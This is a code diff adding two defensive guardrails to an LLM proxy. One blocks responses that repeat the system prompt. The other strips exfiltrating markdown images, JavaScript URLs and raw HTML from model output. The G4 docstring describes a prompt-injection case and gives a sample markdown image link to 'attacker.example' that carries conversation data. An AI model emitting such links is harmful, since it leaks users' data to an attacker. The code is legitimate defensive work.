@@ -10,7 +10,7 @@ from guardrails import audit
 from guardrails.canonical import canonicalize
 from guardrails.policy import ControlConfig, Policy, decide
 from guardrails.scanners.injection import InjectionScanner
-from guardrails.scanners.patterns import scan_secrets
+from guardrails.scanners.patterns import scan_exfil, scan_secrets, scan_system_echo
 from guardrails.scanners.pii import PiiScanner
 from guardrails.spans import extract_spans
 from guardrails.types import Action, Decision, Span, SpanSource
@@ -750,6 +750,345 @@ class G2bPiiOutput(BaseNufiGuardrail):
         return text
 
 
+class G3SystemPromptLeak(BaseNufiGuardrail):
+    """Blocks a response that regurgitates the system prompt actually in force.
+
+    Compares the response text against the system prompt via `scan_system_echo`
+    (n-gram overlap over CONTIGUOUS word-runs — see that function's docstring
+    for its honest blind spots: a paraphrase or reordering is invisible to it,
+    and a system prompt shorter than its 8-word window is not checked at all).
+    Fires regardless of how the leak was elicited, because the comparison is
+    against the OUTPUT, never against the request that produced it.
+    """
+
+    control_id = "G3"
+    # `async_pre_call_hook`-shaped outage handling: `scan_system_echo` is
+    # documented pure (no I/O, never raises — see scanners/patterns.py's
+    # module docstring), but `G1Injection`'s own history is the reason
+    # nothing in this module trusts a scanner contract absolutely just
+    # because it is documented — a bug in a future edit of a "pure"
+    # function is still a bug. This control DOES have a real blocking
+    # mechanism (`GuardrailBlocked` below), so an outage under `fail:
+    # closed` is a genuine block, not a phantom one — declared `True` to
+    # match, mirroring `G1Injection` rather than `G2aPiiInput`/`G2bPiiOutput`
+    # (which have no such mechanism and correctly declare `False`).
+    outage_can_enforce = True
+
+    @staticmethod
+    def _system_prompt(request_data: dict[str, Any]) -> str:
+        parts = [
+            span.text
+            for span in extract_spans(request_data.get("messages"))
+            if span.source is SpanSource.SYSTEM
+        ]
+        return "\n".join(parts)
+
+    def _on_outage(self, data: dict[str, Any], exc: Exception) -> None:
+        """Record the outage, then act on it — mirrors `G1Injection._on_outage`.
+
+        Called once for a request-wide certification failure (the system
+        prompt itself could not be determined — see the malformed-`messages`
+        guard below) or once per text whose own `scan_system_echo` call
+        raised. Either way this control could not certify THAT text/request
+        as leak-free, which is `Decision(action=Action.BLOCK, findings=())`
+        by the same reasoning `G1Injection._on_outage` documents: an outage
+        always means "we could not certify this", independent of whether
+        `fail`/`mode` goes on to act on it. `enforced` is gated by
+        `outage_can_enforce` (see the class attribute above) alongside
+        `fails_closed` and `_enforcing()`, so a future edit that ever drops
+        the `= True` override cannot silently start raising anyway — the
+        exact defensive shape `G1Injection._on_outage` already uses this
+        gate for.
+        """
+        verbose_proxy_logger.warning(
+            "guardrail %s could not certify response (%s): %s",
+            self.control_id,
+            type(exc).__name__,
+            exc,
+        )
+        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
+        decision = Decision(
+            action=Action.BLOCK,
+            control=self.control_id,
+            risk=self._control.risk,
+            findings=(),
+            reason=f"guardrail unavailable: {type(exc).__name__}",
+        )
+        enforced = self.outage_can_enforce and self._control.fails_closed and self._enforcing()
+        event = self._emit(data, decision, (), None, enforced)
+        if enforced:
+            raise GuardrailBlocked(
+                code="GUARDRAIL_UNAVAILABLE",
+                event_id=event["event_id"],
+                detail=str(exc),
+                status_code=503,
+            )
+
+    async def apply_guardrail(
+        self,
+        inputs: dict[str, Any],
+        request_data: dict[str, Any] | None,
+        input_type: str,
+        logging_obj: Any = None,
+    ) -> dict[str, Any]:
+        """Block a response that echoes the system prompt.
+
+        Same real `apply_guardrail` contract as `G2bPiiOutput` — see that
+        method's docstring for why the signature and the `"response"`-only
+        gate are load-bearing, verified against the installed
+        litellm==1.83.10 source rather than the docs page.
+
+        Each text is scanned and decided ON ITS OWN: nothing on `Finding`
+        identifies which text produced it (same reasoning `G2bPiiOutput`
+        documents), and a text with `n>1` candidate completions must not
+        have a leak in one candidate block a clean sibling from ever being
+        evaluated — the loop below raises as soon as ONE text's own
+        decision blocks, rather than pooling every text's findings into a
+        single request-wide verdict first.
+        """
+        if input_type != "response" or not self._control.enabled:
+            return inputs
+
+        texts = inputs.get("texts") or []
+        if not texts:
+            return inputs
+
+        data = request_data if isinstance(request_data, dict) else {}
+        messages = data.get("messages")
+        if messages is not None and (
+            not isinstance(messages, list)
+            or any(not isinstance(message, dict) for message in messages)
+        ):
+            # Same malformed-shape risk `G1Injection` guards against:
+            # `extract_spans` (called by `_system_prompt` below) assumes a
+            # list of dict messages and is off limits to modify here. We
+            # cannot even determine what the system prompt IS, so nothing
+            # downstream can be certified — routed through `_on_outage`
+            # rather than raising `AttributeError` from deep inside
+            # `extract_spans`, an exception type this hook does not expect.
+            self._on_outage(data, TypeError("'messages' is not a list of dicts"))
+            return inputs
+
+        system_prompt = self._system_prompt(data)
+        if not system_prompt:
+            # No system message in the request (or one too short for
+            # `scan_system_echo`'s own `_MIN_SYSTEM_PROMPT_WORDS` gate to
+            # bother comparing — that shorter-prompt case is instead caught
+            # inside `scan_system_echo` itself, per-text, below). Nothing to
+            # compare the response against, so there is nothing to leak.
+            # Silent — no audit event — matching every other control's
+            # "nothing to evaluate" shortcut (`G1Injection`'s `if not spans`,
+            # `G2bPiiOutput`'s `if not texts`): an ALLOW with no finding never
+            # gets an event either, so this is not a new exception to that
+            # rule, just reached one branch earlier.
+            return inputs
+
+        for item in texts:
+            if not isinstance(item, str) or not item:
+                continue
+
+            started = time.perf_counter()
+            try:
+                findings = scan_system_echo(item, system_prompt)
+            except Exception as exc:
+                # Caught broadly, not narrowed to a specific type: matches
+                # every other control in this module (`G1Injection`,
+                # `G2aPiiInput`, `G2bPiiOutput`) — trusting `scan_system_echo`'s
+                # documented "pure, never raises" contract absolutely is one
+                # bug away from turning a shadow-mode measurement, or this
+                # control's own fail-closed guarantee, into an unhandled
+                # exception escaping the LiteLLM hook. Scoped to THIS text —
+                # a scan failure on one candidate must not discard another
+                # text's already-computed, already-audited decision in the
+                # same batch (the Task 11 lesson `G2bPiiOutput.apply_guardrail`
+                # documents at length).
+                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
+                    time.perf_counter() - started
+                )
+                self._on_outage(data, exc)
+                continue
+            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
+                time.perf_counter() - started
+            )
+            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)
+
+            decision = decide(self._control, findings, grounded=False)
+            if decision.action is Action.ALLOW:
+                continue
+
+            enforced = self._enforcing()
+            event = self._emit(data, decision, (), None, enforced)
+            if enforced:
+                raise GuardrailBlocked(
+                    code="LLM07_SYSTEM_PROMPT_LEAK",
+                    event_id=event["event_id"],
+                    detail=decision.reason,
+                    status_code=400,
+                )
+
+        return inputs
+
+
+class G4OutputHandling(BaseNufiGuardrail):
+    """Strips exfiltration vectors from a response without discarding it.
+
+    An attacker plants `![](https://attacker.example/log?d=<summary>)` in a
+    RAG-indexed document; the model repeats it; the client renders the
+    markdown; the browser fetches it with the data attached — no click, no
+    other user interaction. Unlike `G3SystemPromptLeak`, this control never
+    blocks: discarding a whole answer over one embedded image is
+    disproportionate when the fix is to remove the element and keep the rest.
+    """
+
+    control_id = "G4"
+    # This control has no blocking mechanism at all — every path through
+    # `apply_guardrail` and `_on_outage` ends in returning (a possibly
+    # rewritten) `inputs`, never `GuardrailBlocked`, in every mode, on every
+    # finding. Explicit (matching `G2aPiiInput`'s style) rather than left to
+    # the inherited default so the "G4 never blocks" invariant is stated
+    # here, next to the class it describes, not just implied by omission —
+    # recording `enforced=True` on an outage this control cannot act on
+    # would write a phantom entry into `nufi_guardrail_decisions_total
+    # {action="block", enforced="true"}`, the series G1Injection shares
+    # where every entry IS a real block.
+    outage_can_enforce = False
+
+    @staticmethod
+    def strip(text: str, findings: list[Any]) -> str:
+        """Replace each finding's span with `[removed:ENTITY]`, back to front.
+
+        Mirrors `G2bPiiOutput.redact`'s clamping (see that method's
+        docstring for the full reasoning): findings are processed in
+        DESCENDING `start` order, and each finding's offsets are clamped to
+        `[0, len(text)]` and to the region not yet consumed by a
+        previously-processed (higher-start) finding. `scan_exfil`'s three
+        finding kinds (`EXTERNAL_IMAGE`, `JAVASCRIPT_URL`, `RAW_HTML`) come
+        from non-overlapping regexes today, but trusting "the regexes never
+        overlap" absolutely is exactly the assumption an earlier draft of
+        `G2bPiiOutput.redact` made about Presidio and the secrets scanner
+        before Task 11 found it broken by two independent detectors
+        reporting overlapping spans on the same text — unclamped offsets on
+        an overlapping or out-of-bounds finding corrupt the surrounding text
+        instead of raising, so nothing would ever surface the mistake.
+        """
+        if not findings:
+            return text
+        length = len(text)
+        out = text
+        consumed_from = length
+        for finding in sorted(findings, key=lambda f: f.start, reverse=True):
+            start = max(0, min(finding.start, length))
+            end = max(start, min(finding.end, length))
+            end = min(end, consumed_from)
+            if start >= end:
+                # Fully inside a region a higher-start finding already
+                # removed (or an offset that does not fit `text` at all) —
+                # nothing left here to act on.
+                continue
+            label = finding.entity or "REMOVED"
+            out = out[:start] + f"[removed:{label}]" + out[end:]
+            consumed_from = start
+        return out
+
+    def _on_outage(self, item: str, request_data: Any, exc: Exception) -> str:
+        """Record the outage, then fail open: return `item` unstripped.
+
+        Mirrors `G2bPiiOutput._on_outage`: `enforced` is always `False` —
+        this control has no mechanism to withhold or alter a response at all
+        (unlike `G3SystemPromptLeak`, it never raises `GuardrailBlocked`),
+        so recording anything else would claim an effect that never
+        happened. Failing open here means an unscanned exfiltration vector
+        reaches the client unstripped — the same "invisible unless recorded"
+        risk `G2bPiiOutput._on_outage` documents for unredacted PII, so the
+        outage is still routed through `_emit` rather than only flipping
+        `GUARDRAIL_DEGRADED` (a fleet-wide gauge an operator investigating
+        one specific report cannot attach to any one request).
+        """
+        verbose_proxy_logger.warning(
+            "guardrail %s could not scan response (%s): %s",
+            self.control_id,
+            type(exc).__name__,
+            exc,
+        )
+        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
+        data = request_data if isinstance(request_data, dict) else {}
+        decision = Decision(
+            action=Action.BLOCK,
+            control=self.control_id,
+            risk=self._control.risk,
+            findings=(),
+            reason=f"guardrail unavailable: {type(exc).__name__}",
+        )
+        self._emit(data, decision, (), None, False)
+        return item
+
+    async def apply_guardrail(
+        self,
+        inputs: dict[str, Any],
+        request_data: dict[str, Any] | None,
+        input_type: str,
+        logging_obj: Any = None,
+    ) -> dict[str, Any]:
+        """Strip exfiltration vectors from a response, per text.
+
+        Same real `apply_guardrail` contract as `G2bPiiOutput` and
+        `G3SystemPromptLeak` — see `G2bPiiOutput.apply_guardrail`'s
+        docstring for why the signature and the `"response"`-only gate are
+        load-bearing. Each text is scanned and decided independently, for
+        the same reason `G2bPiiOutput` documents: nothing on `Finding`
+        identifies which text produced it, and one text's scan failure must
+        not discard another text's already-computed, already-audited strip.
+        """
+        if input_type != "response" or not self._control.enabled:
+            return inputs
+
+        texts = inputs.get("texts") or []
+        if not texts:
+            return inputs
+
+        allowlist = list(self._control.options.get("image_host_allowlist") or [])
+        data = request_data if isinstance(request_data, dict) else {}
+        enforced = self._enforcing()
+        rewritten: list[str] = []
+
+        for item in texts:
+            if not item:
+                rewritten.append(item)
+                continue
+
+            started = time.perf_counter()
+            try:
+                findings = scan_exfil(item, allowlist)
+            except Exception as exc:
+                # Caught broadly for the same reason as `G2bPiiOutput`:
+                # `scan_exfil` is documented pure and never-raising, but
+                # trusting that absolutely is one bug away from an unhandled
+                # exception escaping this hook. Scoped to THIS item only.
+                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
+                    time.perf_counter() - started
+                )
+                rewritten.append(self._on_outage(item, data, exc))
+                continue
+            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
+                time.perf_counter() - started
+            )
+            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)
+
+            decision = decide(self._control, findings, grounded=False)
+            if decision.action is not Action.REDACT:
+                rewritten.append(item)
+                continue
+
+            self._emit(data, decision, (), None, enforced)
+            rewritten.append(self.strip(item, list(decision.findings)) if enforced else item)
+
+        if enforced:
+            inputs["texts"] = rewritten
+        return inputs
+
+
 g1_injection = G1Injection()
 g2a_pii_input = G2aPiiInput()
 g2b_pii_output = G2bPiiOutput()
+g3_system_prompt_leak = G3SystemPromptLeak()
+g4_output_handling = G4OutputHandling()
